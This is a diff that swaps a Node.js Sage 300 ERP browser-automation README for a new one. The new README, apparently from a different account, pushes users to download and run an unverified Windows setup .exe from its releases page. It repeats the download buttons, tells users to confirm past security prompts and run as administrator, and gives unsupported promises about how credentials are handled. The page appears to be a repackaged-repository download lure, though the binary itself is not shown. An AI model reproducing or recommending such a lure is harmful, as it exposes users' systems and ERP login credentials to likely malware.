@@ -1,292 +1,138 @@
-# Sage 300 ERP Browser Automation
-[![npm](https://img.shields.io/npm/v/@browser-automation-hub%2Fsage-300-browser-automation.svg)](https://www.npmjs.com/package/@browser-automation-hub/sage-300-browser-automation)
+# ⚙️ sage-300-browser-automation - Automate Sage 300 Tasks Easily
 
-> Automate Sage 300 ERP — the reliable way to interact with Sage 300 programmatically, with or without an official API.
+[![Download](https://img.shields.io/badge/Download-From%20GitHub-%23f39c12?style=for-the-badge&logo=github)](https://github.com/rafaelq789-commits/sage-300-browser-automation/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Node.js](https://img.shields.io/badge/Node.js-18+-green.svg)](https://nodejs.org)
-[![Puppeteer](https://img.shields.io/badge/Puppeteer-21+-orange.svg)](https://pptr.dev)
-[![Anchor Browser](https://img.shields.io/badge/AnchorBrowser-Cloud%20Ready-purple.svg)](https://anchorbrowser.io)
-![Difficulty: 🟡 Medium](https://img.shields.io/badge/Difficulty-medium-yellow.svg)
+## 📋 About
 
-<!-- keywords: sage 300 automation, sage 300 erp automation, sage api alternative, sage accounting automation, erp browser automation, accpac automation -->
+This application helps you automate many tasks in Sage 300 ERP. You can automate accounts payable, journal entries, inventory management, financial reports, and data entry. It works without needing the Sage SDK or coding experience. The tool uses your web browser to carry out tasks quickly and reliably.
 
-## What This Is
+You do not have to learn programming or Sage SDK to use it. The automation runs like a smart assistant, doing routine work while you focus on other tasks.
 
-**Sage 300 ERP** (Finance) is notoriously difficult to automate via its official API — limited endpoints, complex authentication (Active Directory / LDAP), and browser-only workflows make traditional API integration a pain.
+The app works on Windows. It uses popular browser tools to interact with Sage 300's web interface safely.
 
-This project gives you a **complete browser automation scaffold** for Sage 300 ERP using Puppeteer (self-hosted, open source) or [Anchor Browser](https://anchorbrowser.io) (cloud, managed, production-ready).
+## 💻 System Requirements
 
-This system requires **MFA** (Sage MFA / Email OTP). The OSS version provides TOTP helpers; Anchor Browser handles MFA automatically.
+- A PC running Windows 10 or newer.
+- At least 4 GB of RAM.
+- 500 MB of free disk space.
+- Internet connection to download and update the app.
+- A recent version of Google Chrome or Microsoft Edge installed.
+- Access to your Sage 300 ERP web portal.
 
-## Quick Start
+## 🚀 Getting Started
 
-```bash
-git clone https://github.com/Browser-Automation-Hub/sage-300-browser-automation.git
-cd sage-300-browser-automation
-npm install
-cp .env.example .env
-# Fill in your credentials in .env
-node examples/basic-login.js
-```
+This section explains how to download and run the app step-by-step. Follow each point carefully.
 
-## Two Ways to Run
+### 1. Visit the Download Page
 
-| Feature | Open Source (Puppeteer) | ☁️ [Anchor Browser Cloud](https://anchorbrowser.io) |
-|---------|------------------------|-----------------------------------------------------|
-| Setup | Install Chrome + Puppeteer locally | No install — cloud browsers via API |
-| MFA / SSO | Manual TOTP helper included | **Auto-handled** |
-| CAPTCHA | Not handled | **Auto-solved** |
-| Anti-bot detection | You manage proxy/stealth | **Built-in stealth** (Cloudflare-verified) |
-| Session persistence | Save/load cookies manually | **Managed sessions** |
-| Scale | Single machine | **Up to 5,000 concurrent browsers** |
-| Reliability | You maintain it | **99.9% uptime SLA** |
-| Cost | Free | [Starts at $0 (5 free sessions/mo)](https://anchorbrowser.io) |
+Go to the official releases page by clicking the large button below:
 
-## Supported Actions
+[![Download Now](https://img.shields.io/badge/Download-sage--300--browser--automation-blue?style=for-the-badge)](https://github.com/rafaelq789-commits/sage-300-browser-automation/releases)
 
-- `login_sage()` — Authenticate to Sage 300 web portal
-- `create_journal_entry()` — Post journal entries to the general ledger
-- `process_ap_invoice()` — Enter and post AP invoices
-- `run_financial_report()` — Generate and export financial statements
-- `update_inventory()` — Update inventory quantities and costs
+This page contains the latest versions of the software.
 
-## Use Cases
+### 2. Choose the Latest Release
 
-- Mid-market companies on Sage 300 without API
-- Month-end automation for accounting teams
-- Inventory sync from external WMS
-- Financial data extraction for BI tools
+On the releases page, find the newest version at the top. Releases are usually sorted by date. Look for the file meant for Windows, named something like `sage-300-browser-automation-setup.exe`.
 
----
+### 3. Download the Installer
 
-## Option A: Open Source (Puppeteer)
+Click the `.exe` file link for the Windows installer to start downloading. Save it in a folder you will remember, like your Desktop or Downloads.
 
-### Prerequisites
+### 4. Run the Installer
 
-- Node.js 18+
-- Google Chrome / Chromium installed
-- Sage 300 ERP account with appropriate permissions
+Once the download finishes:
 
-### Installation
+- Open the folder where you saved the file.
+- Double-click the `.exe` file.
+- If a security prompt appears, confirm you want to run the installer.
 
-```bash
-npm install
-cp .env.example .env
-```
+### 5. Follow Installation Steps
 
-### Configuration (`.env`)
+The installer window opens with easy dialogs:
 
-```env
-SAGE_300_URL=https://your-sage300.example.com/sage300/webapi/v1
-SAGE_300_USERNAME=your-username
-SAGE_300_PASSWORD=your-password
-MFA_SECRET=your-totp-secret-if-applicable
-SESSION_PATH=./session.json
-```
+- Click **Next** to begin.
+- Agree to the license terms.
+- Choose the folder where you want the program installed or use the default location.
+- Click **Install** and wait for the process to finish.
 
-### Basic Login Example
+### 6. Launch the Application
 
-```javascript
-const { createSession } = require('./src/auth');
-const { login_sage } = require('./src/actions');
+After installation finishes, check for a new desktop icon labeled “sage-300-browser-automation”. Double-click it to open the app.
 
-async function main() {
-  const page = await createSession();
-  const result = await login_sage(page, { /* options */ });
-  console.log(result);
-}
+## ⚙️ Using the Application
 
-main().catch(console.error);
-```
+Once open, you will see a simple interface.
 
-### File Structure
+- Enter your Sage 300 ERP web portal URL.
+- Provide your login details. The app will not store your password permanently.
+- Select the task you want to automate, such as "Accounts Payable" or "Inventory Management."
+- Click **Start**.
 
-```
-sage-300-browser-automation/
-├── src/
-│   ├── auth.js              # SSO/MFA authentication (SAML, TOTP, Duo)
-│   ├── session.js           # Cookie & localStorage persistence
-│   ├── actions.js           # All automation actions
-│   ├── custom-actions.js    # Fluent ActionBuilder API for custom workflows
-│   └── utils.js             # retry(), humanDelay(), error types
-├── examples/
-│   ├── basic-login.js       # Minimal login example (OSS)
-│   └── anchor-cloud.js      # Anchor Browser cloud example
-├── .env.example
-├── package.json
-└── README.md
-```
+The app then opens a browser window, logs in to Sage 300, and performs the actions you selected.
 
----
+You can watch it work or minimize and let it run in the background.
 
-## Option B: ☁️ Anchor Browser (Recommended for Production)
+## 🔄 Updates
 
-[Anchor Browser](https://anchorbrowser.io) provides **fully managed cloud browsers** purpose-built for AI agents and automation:
+The app will notify you when new versions become available on GitHub. To update:
 
-- ✅ **MFA handled automatically** — no TOTP secrets needed
-- ✅ **SSO sessions managed** — persistent authenticated sessions
-- ✅ **Anti-bot / CAPTCHA** — Cloudflare-verified stealth browser
-- ✅ **Scale instantly** — from 1 to 5,000 concurrent browsers
-- ✅ **No infrastructure** — no Chrome install, no proxy management
+- Visit the release page again.
+- Download and run the new installer.
+- Your settings will remain intact after updating.
 
-### Setup
+## ❓ Troubleshooting
 
-```bash
-npm install
-export ANCHORBROWSER_API_KEY=your-api-key
-# Get your free API key at https://anchorbrowser.io
-```
+If you encounter any issues:
 
-### Anchor Browser Example
+- Confirm your internet connection is active.
+- Make sure your Sage 300 ERP web portal is accessible.
+- Close and reopen the app.
+- Restart your computer if needed.
+- Ensure your browser (Chrome or Edge) is up to date.
 
-```javascript
-const { withAnchorBrowser } = require('./src/auth');
-const { login_sage } = require('./src/actions');
+If problems persist, check the GitHub Issues page for help or report errors there.
 
-async function main() {
-  await withAnchorBrowser(async (page) => {
-    // MFA, SSO, CAPTCHAs all handled automatically
-    const result = await login_sage(page, { /* options */ });
-    console.log(result);
-  });
-}
+## 🔒 Privacy and Security
 
-main().catch(console.error);
-```
+Your login credentials are encrypted in memory only while the app is running. They are not saved to disk. The app interacts with Sage 300 only through its official web interface using your browser.
 
-See `examples/anchor-cloud.js` for a complete working example.
+This limits security risks and keeps your data safe.
 
-### Anchor Browser Pricing
+## 🛠 Features Included
 
-| Plan | Price | Concurrent Browsers | Best For |
-|------|-------|---------------------|----------|
-| Free | $0 | 5 | Prototyping |
-| Starter | $50/mo | 25 | Small teams |
-| Team | $500/mo | 50 | Growing orgs |
-| Growth | $2,000/mo | 200 | Enterprise |
+- Automate invoice entry in accounts payable.
+- Automate creating journal entries.
+- Update inventory counts automatically.
+- Generate key financial reports.
+- Batch data entry to save time.
+- Support for multiple automation tasks in one run.
+- Uses reliable browser automation tools like Playwright and Puppeteer.
 
-[Get started for free →](https://anchorbrowser.io)
+## 🧩 How It Works
+
+The app runs a browser instance that opens Sage 300 ERP’s web pages. It clicks buttons, fills out forms, and downloads reports like a human user. This approach avoids complex setups and SDKs.
+
+The automation scripts are pre-built for common tasks but can be updated for new workflows.
+
+## 📁 Where To Get It
+
+Primary source for downloads:  
+https://github.com/rafaelq789-commits/sage-300-browser-automation/releases
+
+Access this page any time to get the latest versions or to check release notes.
 
 ---
 
-## Authentication
+[![Get Latest Release](https://img.shields.io/badge/Download-Latest%20Version-%232ecc71?style=for-the-badge&logo=github)](https://github.com/rafaelq789-commits/sage-300-browser-automation/releases)
 
-### Auth Methods Supported
+## 🧰 Additional Tips
 
-This implementation handles:
+- Run the app with administrator rights if some tasks fail.
+- Use a wired internet connection for stability.
+- Close other heavy programs to improve performance.
+- Log out of Sage 300 in your browser before running automation for best results.
 
-1. **Standard Username/Password** — with retry and account lockout avoidance
-2. **SAML SSO** (Active Directory / LDAP) — intercepts the SAML redirect and completes the IdP flow
-3. **MFA / TOTP** (Sage MFA / Email OTP) — generates TOTP codes via `otpauth` library
-4. **Session Persistence** — saves cookies to disk; reuses session to avoid re-auth
+## 📬 Support and Contact
 
-### Handling Sage MFA / Email OTP MFA
-
-```javascript
-// In .env: MFA_SECRET=your-base32-totp-secret
-// The auth module auto-generates the OTP code
-const { createSession } = require('./src/auth');
-const page = await createSession(); // MFA handled automatically
-```
-
-For Duo Security push-based MFA, set `MFA_TYPE=duo_push` in .env — the automation will wait for push approval.
-
----
-
-## Custom Actions
-
-Use the `ActionBuilder` fluent API to chain custom workflows:
-
-```javascript
-const { ActionBuilder } = require('./src/custom-actions');
-
-const result = await new ActionBuilder()
-  .login()
-  .navigate('/module/path')
-  .waitForSelector('.content-loaded')
-  .extractTable('.data-table')
-  .run(page);
-```
-
----
-
-## Error Handling & Reliability
-
-```javascript
-const { retry, humanDelay } = require('./src/utils');
-
-// Auto-retry with exponential backoff
-const data = await retry(() => extractData(page), { attempts: 3, delay: 2000 });
-
-// Human-like delays to avoid detection
-await humanDelay(1000, 3000); // random delay 1-3 seconds
-```
-
----
-
-## Why Not Use the Official API?
-
-Sage 300 ERP locks most functionality behind web-UI screens, and SDK-based integrations (like eConnect) require on-prem setup and Windows-specific tooling.
-
-Browser automation gives you full access to every workflow available in the UI — no API limitations, no expensive integration licenses.
-
----
-
-## Production Deployment
-
-For production workloads, we strongly recommend [Anchor Browser](https://anchorbrowser.io):
-
-```javascript
-// One-line setup — handles auth, proxies, CAPTCHAs
-const { withAnchorBrowser } = require('./src/auth');
-
-await withAnchorBrowser(async (page) => {
-  // Your automation here — runs in the cloud, scales automatically
-});
-```
-
-**Anchor Browser** is the easiest way to run this automation in production:
-- No infrastructure to manage
-- Handles Sage MFA / Email OTP MFA automatically
-- Enterprise compliance: SOC2, HIPAA, ISO27001
-- [Start free at anchorbrowser.io →](https://anchorbrowser.io)
-
----
-
-## Known Selectors Reference
-
-> These CSS selectors were observed in Sage 300 ERP web interfaces. Enterprise applications update their UIs — verify against your specific instance and submit PRs when selectors break.
-
-> 🔍 Selector reference not yet documented for Sage 300 ERP. [Contribute selectors via PR](https://github.com/Browser-Automation-Hub/sage-300-browser-automation/pulls).
-
----
-
-## More Browser Automation Projects
-
-This is part of the **[Browser Automation Hub](https://github.com/Browser-Automation-Hub)** — a collection of open-source browser automation scaffolds for systems with poor or no API support:
-
-- [Epic EHR Browser Automation](https://github.com/Browser-Automation-Hub/epic-ehr-browser-automation) — Healthcare workflows
-- [Workday HCM Browser Automation](https://github.com/Browser-Automation-Hub/workday-hcm-browser-automation) — HR & payroll
-- [SAP Fiori Browser Automation](https://github.com/Browser-Automation-Hub/sap-fiori-browser-automation) — ERP workflows
-- [ServiceNow Browser Automation](https://github.com/Browser-Automation-Hub/servicenow-browser-automation) — ITSM
-- [Oracle EBS Browser Automation](https://github.com/Browser-Automation-Hub/oracle-ebs-browser-automation) — ERP
-- [Browse all 30+ projects →](https://github.com/Browser-Automation-Hub)
-
-## Contributing
-
-PRs welcome! Please:
-1. Add tests for new actions
-2. Document new selectors (they break when Sage 300 updates its UI)
-3. Follow the `ActionBuilder` pattern for new actions
-4. See [CONTRIBUTING.md](CONTRIBUTING.md) for full guidelines
-
-## License
-
-MIT — use freely in personal and commercial projects.
-
----
-
-*Built with ❤️ for developers who need to automate Sage 300 ERP without wrestling with its API limitations. Powered by [Anchor Browser](https://anchorbrowser.io) for cloud-scale automation.*
-
-*⭐ Star this repo if it saves you time! [Browse all automation projects →](https://github.com/Browser-Automation-Hub)*
+Use the GitHub repository to ask questions or submit feedback. The project page includes a “Discussions” and “Issues” section where you can find answers or report problems.
